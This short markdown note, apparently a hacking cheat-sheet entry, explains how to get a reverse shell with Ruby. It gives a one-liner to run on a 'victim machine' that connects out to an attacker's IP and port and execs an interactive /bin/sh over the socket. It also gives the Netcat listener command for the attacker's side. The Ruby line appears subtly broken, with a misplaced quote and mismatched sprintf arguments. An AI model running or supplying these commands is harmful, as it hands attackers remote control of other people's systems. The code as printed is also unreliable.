# Remote Shell with Ruby using a remote machine

Script executed on the "Victim machine"

`ruby -rsocket -e 'f=TCPSocket.open([IP], [PORT]).to_i';exec sprintf('/bin/sh -i <&%d 2>&%d',f,f,f)`

Executes a socket communication and connects to an specified IP address (the Host of the attacker machine), later executes a sprintf command for getting a shell remotely.

On the attacker side, we use Netcat for hearing the activities on the previous code using the exact same PORT between both machines:

`nc -vvvv -l -p [PORT]`
